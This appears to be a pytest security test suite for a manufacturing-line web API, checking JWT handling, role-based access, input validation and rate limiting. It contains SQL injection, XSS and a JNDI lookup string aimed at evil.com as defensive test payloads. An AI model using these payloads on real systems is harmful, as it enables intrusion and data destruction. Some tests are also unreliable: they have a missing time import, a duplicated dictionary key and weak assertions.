"""
Comprehensive Security Tests
Tests authentication, authorization, data protection, and security vulnerabilities
"""

import pytest
import asyncio
import httpx
import json
import jwt
from datetime import datetime, timedelta
from uuid import uuid4
import hashlib
import base64

from backend.app.main import app
from backend.app.auth.jwt_handler import create_access_token, decode_token


class TestAuthenticationSecurity:
    """Authentication security tests"""
    
    @pytest.fixture
    async def client(self):
        """Create HTTP client for security testing"""
        async with httpx.AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    def test_jwt_token_creation_and_validation(self):
        """Test JWT token creation and validation"""
        # Test data
        token_data = {
            "sub": str(uuid4()),
            "email": "test@example.com",
            "role": "admin",
            "permissions": ["read", "write", "admin"]
        }
        
        # Create token
        token = create_access_token(token_data)
        
        # Validate token structure
        assert isinstance(token, str)
        assert len(token) > 0
        
        # Decode token
        decoded = decode_token(token)
        
        # Validate decoded data
        assert decoded["sub"] == token_data["sub"]
        assert decoded["email"] == token_data["email"]
        assert decoded["role"] == token_data["role"]
        assert "exp" in decoded  # Expiration time
    
    def test_jwt_token_expiration(self):
        """Test JWT token expiration handling"""
        # Create token with short expiration
        token_data = {
            "sub": str(uuid4()),
            "email": "test@example.com",
            "role": "admin"
        }
        
        # Mock short expiration time
        with pytest.MonkeyPatch().context() as m:
            m.setattr("backend.app.auth.jwt_handler.timedelta", lambda **kwargs: timedelta(seconds=1))
            
            token = create_access_token(token_data)
            
            # Token should be valid initially
            decoded = decode_token(token)
            assert decoded["sub"] == token_data["sub"]
            
            # Wait for expiration
            import time
            time.sleep(2)
            
            # Token should be expired
            with pytest.raises(jwt.ExpiredSignatureError):
                decode_token(token)
    
    def test_jwt_token_tampering_detection(self):
        """Test JWT token tampering detection"""
        # Create valid token
        token_data = {
            "sub": str(uuid4()),
            "email": "test@example.com",
            "role": "admin"
        }
        
        token = create_access_token(token_data)
        
        # Tamper with token
        tampered_token = token[:-5] + "XXXXX"
        
        # Tampered token should be rejected
        with pytest.raises(jwt.InvalidTokenError):
            decode_token(tampered_token)
    
    def test_jwt_token_invalid_signature(self):
        """Test JWT token with invalid signature"""
        # Create token with wrong secret
        token_data = {
            "sub": str(uuid4()),
            "email": "test@example.com",
            "role": "admin"
        }
        
        # Use wrong secret to create token
        wrong_secret = "wrong_secret_key"
        token = jwt.encode(
            {**token_data, "exp": datetime.utcnow() + timedelta(hours=1)},
            wrong_secret,
            algorithm="HS256"
        )
        
        # Token with wrong signature should be rejected
        with pytest.raises(jwt.InvalidTokenError):
            decode_token(token)
    
    @pytest.mark.asyncio
    async def test_authentication_required_endpoints(self, client):
        """Test that protected endpoints require authentication"""
        protected_endpoints = [
            "/api/v1/production/lines",
            "/api/v1/job-assignments",
            "/api/v1/oee/lines/test-line",
            "/api/v1/andon/events",
            "/api/v1/dashboard/lines"
        ]
        
        for endpoint in protected_endpoints:
            response = await client.get(endpoint)
            
            # Should return 401 Unauthorized
            assert response.status_code == 401
            
            # Response should indicate authentication is required
            if response.status_code == 401:
                response_data = response.json()
                assert "detail" in response_data
    
    @pytest.mark.asyncio
    async def test_invalid_authentication_formats(self, client):
        """Test various invalid authentication formats"""
        invalid_auth_headers = [
            {"Authorization": "InvalidFormat token123"},
            {"Authorization": "Bearer"},
            {"Authorization": "Bearer "},
            {"Authorization": "Basic dXNlcjpwYXNz"},
            {"Authorization": "Bearer invalid_token_format"},
            {}  # No authorization header
        ]
        
        for auth_header in invalid_auth_headers:
            response = await client.get(
                "/api/v1/production/lines",
                headers=auth_header
            )
            
            # Should return 401 Unauthorized
            assert response.status_code == 401
    
    @pytest.mark.asyncio
    async def test_authentication_token_injection(self, client):
        """Test protection against token injection attacks"""
        # Create valid token
        token_data = {
            "sub": str(uuid4()),
            "email": "test@example.com",
            "role": "admin"
        }
        
        valid_token = create_access_token(token_data)
        
        # Test various injection attempts
        injection_attempts = [
            f"{valid_token}' OR '1'='1",
            f"{valid_token}; DROP TABLE users;",
            f"{valid_token} UNION SELECT * FROM users",
            f"{valid_token}<script>alert('xss')</script>",
            f"{valid_token}${jndi:ldap://evil.com/exploit}"
        ]
        
        for injection_token in injection_attempts:
            response = await client.get(
                "/api/v1/production/lines",
                headers={"Authorization": f"Bearer {injection_token}"}
            )
            
            # Should reject injected tokens
            assert response.status_code == 401


class TestAuthorizationSecurity:
    """Authorization security tests"""
    
    @pytest.fixture
    async def client(self):
        """Create HTTP client for authorization testing"""
        async with httpx.AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    @pytest.fixture
    def admin_token(self):
        """Create admin token"""
        token_data = {
            "sub": str(uuid4()),
            "email": "admin@example.com",
            "role": "admin",
            "permissions": ["read", "write", "admin"]
        }
        return create_access_token(token_data)
    
    @pytest.fixture
    def operator_token(self):
        """Create operator token"""
        token_data = {
            "sub": str(uuid4()),
            "email": "operator@example.com",
            "role": "operator",
            "permissions": ["read"]
        }
        return create_access_token(token_data)
    
    @pytest.fixture
    def viewer_token(self):
        """Create viewer token"""
        token_data = {
            "sub": str(uuid4()),
            "email": "viewer@example.com",
            "role": "viewer",
            "permissions": ["read"]
        }
        return create_access_token(token_data)
    
    @pytest.mark.asyncio
    async def test_role_based_access_control(self, client, admin_token, operator_token, viewer_token):
        """Test role-based access control"""
        endpoints_and_required_roles = {
            "/api/v1/production/lines": ["admin", "operator", "viewer"],  # Read access
            "/api/v1/production/lines": ["admin", "operator"],  # Write access
            "/api/v1/job-assignments": ["admin", "operator"],  # Job management
            "/api/v1/admin/users": ["admin"],  # Admin only
        }
        
        tokens_by_role = {
            "admin": admin_token,
            "operator": operator_token,
            "viewer": viewer_token
        }
        
        for endpoint, allowed_roles in endpoints_and_required_roles.items():
            for role, token in tokens_by_role.items():
                response = await client.get(
                    endpoint,
                    headers={"Authorization": f"Bearer {token}"}
                )
                
                if role in allowed_roles:
                    # Should allow access
                    assert response.status_code in [200, 404, 500]  # 404/500 are acceptable
                else:
                    # Should deny access
                    assert response.status_code == 403  # Forbidden
    
    @pytest.mark.asyncio
    async def test_permission_based_access(self, client, admin_token, operator_token):
        """Test permission-based access control"""
        # Admin should have all permissions
        admin_response = await client.get(
            "/api/v1/production/lines",
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        # Operator should have limited permissions
        operator_response = await client.get(
            "/api/v1/production/lines",
            headers={"Authorization": f"Bearer {operator_token}"}
        )
        
        # Both should be able to read (if endpoint exists)
        assert admin_response.status_code in [200, 401, 404, 500]
        assert operator_response.status_code in [200, 401, 404, 500]
    
    @pytest.mark.asyncio
    async def test_privilege_escalation_prevention(self, client, operator_token):
        """Test prevention of privilege escalation"""
        # Operator trying to access admin endpoints
        admin_endpoints = [
            "/api/v1/admin/users",
            "/api/v1/admin/system-config",
            "/api/v1/admin/security-logs"
        ]
        
        for endpoint in admin_endpoints:
            response = await client.get(
                endpoint,
                headers={"Authorization": f"Bearer {operator_token}"}
            )
            
            # Should be denied access
            assert response.status_code in [403, 404]  # Forbidden or Not Found
    
    @pytest.mark.asyncio
    async def test_resource_ownership_validation(self, client, admin_token):
        """Test resource ownership validation"""
        # Create a resource with admin token
        resource_data = {
            "line_code": f"OWNERSHIP_TEST_{int(time.time())}",
            "name": "Ownership Test Line",
            "equipment_codes": ["EQ001"],
            "target_speed": 100.0
        }
        
        create_response = await client.post(
            "/api/v1/production/lines",
            json=resource_data,
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        if create_response.status_code == 201:
            resource_id = create_response.json()["id"]
            
            # Try to access with different user (should be allowed for admin)
            different_user_token = create_access_token({
                "sub": str(uuid4()),
                "email": "different@example.com",
                "role": "admin"
            })
            
            access_response = await client.get(
                f"/api/v1/production/lines/{resource_id}",
                headers={"Authorization": f"Bearer {different_user_token}"}
            )
            
            # Should be allowed for admin role
            assert access_response.status_code in [200, 404]


class TestDataProtectionSecurity:
    """Data protection security tests"""
    
    @pytest.fixture
    async def client(self):
        """Create HTTP client for data protection testing"""
        async with httpx.AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    def test_password_hashing(self):
        """Test password hashing security"""
        from backend.app.auth.jwt_handler import hash_password, verify_password
        
        password = "test_password_123"
        
        # Hash password
        hashed = hash_password(password)
        
        # Hashed password should be different from original
        assert hashed != password
        
        # Hashed password should be long enough
        assert len(hashed) > 50
        
        # Should verify correctly
        assert verify_password(password, hashed)
        
        # Should reject wrong password
        assert not verify_password("wrong_password", hashed)
    
    def test_password_strength_validation(self):
        """Test password strength validation"""
        from backend.app.auth.jwt_handler import validate_password_strength
        
        # Test weak passwords
        weak_passwords = [
            "123456",
            "password",
            "abc",
            "12345678",
            "qwerty"
        ]
        
        for weak_password in weak_passwords:
            with pytest.raises(ValueError, match="Password does not meet strength requirements"):
                validate_password_strength(weak_password)
        
        # Test strong password
        strong_password = "StrongP@ssw0rd123!"
        # Should not raise exception
        validate_password_strength(strong_password)
    
    @pytest.mark.asyncio
    async def test_sql_injection_protection(self, client, admin_token):
        """Test SQL injection protection"""
        # Test various SQL injection attempts
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM users --",
            "'; UPDATE users SET role='admin' WHERE email='test@example.com'; --"
        ]
        
        for payload in injection_payloads:
            # Test in query parameters
            response = await client.get(
                f"/api/v1/production/lines?search={payload}",
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            
            # Should not cause server error or data breach
            assert response.status_code != 500
            
            # Response should not contain sensitive data
            if response.status_code == 200:
                response_text = response.text.lower()
                assert "error" not in response_text or "sql" not in response_text
    
    @pytest.mark.asyncio
    async def test_xss_protection(self, client, admin_token):
        """Test XSS (Cross-Site Scripting) protection"""
        # Test various XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//"
        ]
        
        for payload in xss_payloads:
            # Test in JSON data
            test_data = {
                "line_code": f"XSS_TEST_{int(time.time())}",
                "name": payload,
                "description": "XSS test",
                "equipment_codes": ["EQ001"],
                "target_speed": 100.0
            }
            
            response = await client.post(
                "/api/v1/production/lines",
                json=test_data,
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            
            # Should not cause server error
            assert response.status_code != 500
            
            # If successful, verify payload is sanitized
            if response.status_code == 201:
                response_data = response.json()
                assert "<script>" not in response_data.get("name", "")
                assert "javascript:" not in response_data.get("name", "")
    
    @pytest.mark.asyncio
    async def test_csrf_protection(self, client, admin_token):
        """Test CSRF (Cross-Site Request Forgery) protection"""
        # Test CSRF token requirement for state-changing operations
        csrf_test_data = {
            "line_code": f"CSRF_TEST_{int(time.time())}",
            "name": "CSRF Test Line",
            "equipment_codes": ["EQ001"],
            "target_speed": 100.0
        }
        
        # Test without CSRF token (if implemented)
        response = await client.post(
            "/api/v1/production/lines",
            json=csrf_test_data,
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        # Should either succeed (if CSRF not implemented) or fail gracefully
        assert response.status_code in [200, 201, 403, 422]
    
    def test_data_encryption_at_rest(self):
        """Test data encryption at rest"""
        # This would typically test database encryption
        # For now, test that sensitive data is not stored in plain text
        
        sensitive_data = "sensitive_information_123"
        
        # Simulate encryption
        from cryptography.fernet import Fernet
        
        key = Fernet.generate_key()
        cipher_suite = Fernet(key)
        
        encrypted_data = cipher_suite.encrypt(sensitive_data.encode())
        
        # Encrypted data should be different from original
        assert encrypted_data != sensitive_data.encode()
        
        # Should decrypt correctly
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        assert decrypted_data.decode() == sensitive_data
    
    def test_data_transmission_encryption(self):
        """Test data transmission encryption"""
        # Test that data is transmitted over HTTPS
        # This is typically handled at the infrastructure level
        
        import ssl
        import socket
        
        def check_ssl_support(hostname, port=443):
            try:
                context = ssl.create_default_context()
                with socket.create_connection((hostname, port), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        return ssock.version()
            except:
                return None
        
        # Test SSL/TLS support (would use actual domain in production)
        # ssl_version = check_ssl_support("example.com")
        # assert ssl_version is not None


class TestInputValidationSecurity:
    """Input validation security tests"""
    
    @pytest.fixture
    async def client(self):
        """Create HTTP client for input validation testing"""
        async with httpx.AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    @pytest.fixture
    def admin_token(self):
        """Create admin token"""
        token_data = {
            "sub": str(uuid4()),
            "email": "admin@example.com",
            "role": "admin",
            "permissions": ["read", "write", "admin"]
        }
        return create_access_token(token_data)
    
    @pytest.mark.asyncio
    async def test_input_length_validation(self, client, admin_token):
        """Test input length validation"""
        # Test extremely long inputs
        long_string = "A" * 10000
        
        test_data = {
            "line_code": long_string,
            "name": long_string,
            "description": long_string,
            "equipment_codes": ["EQ001"],
            "target_speed": 100.0
        }
        
        response = await client.post(
            "/api/v1/production/lines",
            json=test_data,
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        # Should reject overly long inputs
        assert response.status_code == 422  # Validation error
    
    @pytest.mark.asyncio
    async def test_input_type_validation(self, client, admin_token):
        """Test input type validation"""
        # Test wrong data types
        invalid_data_cases = [
            {"line_code": 123, "name": "Test", "target_speed": "not_a_number"},
            {"line_code": "TEST", "name": 456, "target_speed": 100.0},
            {"line_code": "TEST", "name": "Test", "target_speed": [1, 2, 3]},
            {"line_code": "TEST", "name": "Test", "equipment_codes": "not_an_array"},
        ]
        
        for invalid_data in invalid_data_cases:
            response = await client.post(
                "/api/v1/production/lines",
                json=invalid_data,
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            
            # Should reject invalid data types
            assert response.status_code == 422
    
    @pytest.mark.asyncio
    async def test_input_range_validation(self, client, admin_token):
        """Test input range validation"""
        # Test values outside valid ranges
        invalid_range_data = {
            "line_code": "TEST",
            "name": "Test Line",
            "equipment_codes": ["EQ001"],
            "target_speed": -1000.0  # Negative speed
        }
        
        response = await client.post(
            "/api/v1/production/lines",
            json=invalid_range_data,
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        # Should reject values outside valid range
        assert response.status_code == 422
    
    @pytest.mark.asyncio
    async def test_input_format_validation(self, client, admin_token):
        """Test input format validation"""
        # Test invalid formats
        invalid_format_data = {
            "line_code": "TEST LINE WITH SPACES",  # Invalid format
            "name": "Test Line",
            "equipment_codes": ["EQ001"],
            "target_speed": 100.0
        }
        
        response = await client.post(
            "/api/v1/production/lines",
            json=invalid_format_data,
            headers={"Authorization": f"Bearer {admin_token}"}
        )
        
        # Should reject invalid formats
        assert response.status_code == 422
    
    @pytest.mark.asyncio
    async def test_malformed_json_protection(self, client, admin_token):
        """Test protection against malformed JSON"""
        malformed_json_cases = [
            '{"line_code": "TEST", "name": "Test", "incomplete": true',
            '{"line_code": "TEST", "name": "Test", "invalid": }',
            '{"line_code": "TEST", "name": "Test", "duplicate": "value", "duplicate": "value"}',
            'not json at all',
            '{"line_code": "TEST", "name": "Test", "nested": {"incomplete": true}',
        ]
        
        for malformed_json in malformed_json_cases:
            response = await client.post(
                "/api/v1/production/lines",
                data=malformed_json,
                headers={
                    "Authorization": f"Bearer {admin_token}",
                    "Content-Type": "application/json"
                }
            )
            
            # Should reject malformed JSON
            assert response.status_code == 422


class TestRateLimitingSecurity:
    """Rate limiting security tests"""
    
    @pytest.fixture
    async def client(self):
        """Create HTTP client for rate limiting testing"""
        async with httpx.AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    @pytest.fixture
    def admin_token(self):
        """Create admin token"""
        token_data = {
            "sub": str(uuid4()),
            "email": "admin@example.com",
            "role": "admin",
            "permissions": ["read", "write", "admin"]
        }
        return create_access_token(token_data)
    
    @pytest.mark.asyncio
    async def test_rate_limiting_protection(self, client, admin_token):
        """Test rate limiting protection"""
        # Make many requests quickly
        num_requests = 100
        
        responses = []
        for i in range(num_requests):
            response = await client.get(
                "/api/v1/production/lines",
                headers={"Authorization": f"Bearer {admin_token}"}
            )
            responses.append(response.status_code)
        
        # Check if rate limiting is implemented
        rate_limited_responses = [r for r in responses if r == 429]
        
        if rate_limited_responses:
            # Rate limiting is implemented
            assert len(rate_limited_responses) > 0
            print(f"Rate limiting active: {len(rate_limited_responses)} requests rate limited")
        else:
            # Rate limiting not implemented (acceptable for test environment)
            print("Rate limiting not implemented (test environment)")
    
    @pytest.mark.asyncio
    async def test_brute_force_protection(self, client):
        """Test brute force attack protection"""
        # Simulate brute force login attempts
        num_attempts = 20
        
        for i in range(num_attempts):
            login_data = {
                "email": "admin@example.com",
                "password": f"wrong_password_{i}"
            }
            
            response = await client.post("/api/v1/auth/login", json=login_data)
            
            if response.status_code == 429:
                # Brute force protection is active
                print(f"Brute force protection triggered after {i+1} attempts")
                break
        else:
            # No brute force protection (acceptable for test environment)
            print("Brute force protection not implemented (test environment)")


class TestSecurityHeaders:
    """Security headers tests"""
    
    @pytest.fixture
    async def client(self):
        """Create HTTP client for security headers testing"""
        async with httpx.AsyncClient(app=app, base_url="http://test") as client:
            yield client
    
    @pytest.mark.asyncio
    async def test_security_headers_presence(self, client):
        """Test presence of security headers"""
        response = await client.get("/")
        
        # Check for common security headers
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        present_headers = []
        for header in security_headers:
            if header in response.headers:
                present_headers.append(header)
        
        # At least some security headers should be present
        print(f"Present security headers: {present_headers}")
        
        # This is informational - security headers are often configured at the web server level
        # In a production environment, these would be enforced by the reverse proxy or load balancer


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
